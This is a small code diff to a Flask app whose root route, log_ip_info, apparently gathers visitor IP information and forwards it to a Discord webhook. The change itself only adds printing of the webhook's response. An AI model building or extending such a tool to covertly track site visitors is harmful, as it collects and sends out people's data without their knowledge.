@@ -1,3 +1,4 @@
+
 from flask import Flask, request, Response
 import requests
 import json
@@ -20,7 +21,9 @@ def send_to_discord(info):
         ]
     }
     headers = {"Content-Type": "application/json"}
-    requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(data), headers=headers)
+    response = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(data), headers=headers)
+    print("Discord response status:", response.status_code)
+    print("Discord response body:", response.text)
 
 @app.route('/')
 def log_ip_info():
